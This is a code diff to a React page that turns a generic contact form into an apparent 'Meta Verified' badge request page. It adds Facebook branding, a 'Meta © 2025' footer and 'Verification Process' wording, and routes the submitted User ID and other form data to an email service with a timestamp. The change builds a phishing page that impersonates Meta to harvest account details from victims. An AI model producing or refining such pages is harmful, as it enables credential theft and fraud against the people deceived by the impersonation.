@@ -15,16 +15,17 @@ import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
 import { validationFormSchema } from "@shared/schema";
-import { apiRequest } from "@/lib/queryClient";
 import { useMobile } from "@/hooks/use-mobile";
 import { MobileModal } from "@/components/mobile-modal";
 import { Search } from "lucide-react";
+import { sendValidationFormEmail } from "@/lib/emailService";
 
 export default function Validation() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
   const isMobile = useMobile();
   const [showMobileModal, setShowMobileModal] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   useEffect(() => {
     if (isMobile) {
@@ -42,57 +43,61 @@ export default function Validation() {
 
   const onSubmit = async (data: any) => {
     try {
-      await apiRequest('POST', '/api/contact-form', data);
+      setIsSubmitting(true);
+      await sendValidationFormEmail({
+        ...data,
+        timestamp: new Date().toISOString(),
+      });
+
       localStorage.setItem('validation_data', JSON.stringify(data));
 
       toast({
-        title: "Success",
+        title: "Validation successful",
         description: "Please proceed to the next step",
       });
       setLocation("/confirmation");
     } catch (error) {
+      console.error('EmailJS error:', error);
       toast({
         variant: "destructive",
         title: "Error",
         description: "Failed to submit form. Please try again.",
       });
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-[#ffffff]">
+    <div className="min-h-screen flex flex-col bg-white">
       <MetaTags 
-        title="Contact Form | Validation"
-        description="Contact Form - Initial Step"
+        title="Meta Verified | Validation"
+        description="Request a verified badge on Facebook - Validation Step"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      <nav className="flex items-center justify-between px-4 py-2 border-b border-[#dddfe2]">
+      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
         <div className="flex items-center">
-          <img 
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
-            alt="Logo"
-            className="h-8 sm:h-10"
-          />
+          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
         </div>
-        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-1.5">
-          <Search className="w-4 h-4 text-[#65676B] mr-2" />
+        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
+          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
           <input
             type="text"
             placeholder="Search"
-            className="bg-transparent outline-none text-sm text-[#65676B] placeholder-[#65676B] w-[180px]"
+            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
           />
         </div>
       </nav>
 
-      <div className="flex-1 flex justify-center p-4 sm:p-6">
-        <div className="w-full max-w-md space-y-6">
+      <div className="flex-1 flex justify-center items-center p-4 sm:p-8">
+        <div className="max-w-2xl w-full space-y-6">
           <div className="text-center">
-            <h1 className="text-2xl font-semibold text-[#1c1e21] mb-2">
-              Contact Form
+            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
+              Verification Process
             </h1>
-            <p className="text-[#65676B] text-sm">
-              Please fill in the required information
+            <p className="text-[#65676B] text-sm sm:text-base">
+              Please provide your verification details
             </p>
           </div>
 
@@ -108,10 +113,7 @@ export default function Validation() {
                     </FormLabel>
                     <FormControl>
                       <Input
-                        type="number"
-                        min="0"
-                        pattern="[0-9]+"
-                        minLength={6}
+                        type="text"
                         placeholder="Enter User ID"
                         className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field}
@@ -144,19 +146,19 @@ export default function Validation() {
 
               <Button 
                 type="submit" 
-                className="w-full h-10 bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-sm rounded-md transition-colors duration-200"
-                disabled={form.formState.isSubmitting}
+                className="w-full py-3 text-base bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold rounded-lg transition-colors duration-200"
+                disabled={isSubmitting}
               >
-                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
+                {isSubmitting ? "Verifying..." : "Continue Verification"}
               </Button>
             </form>
           </Form>
         </div>
       </div>
 
-      <footer className="text-center py-4 text-xs text-[#65676B] border-t border-[#dddfe2]">
-        © 2025 Contact Form
-      </footer>
+      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
+        Meta © 2025
+      </div>
     </div>
   );
 }
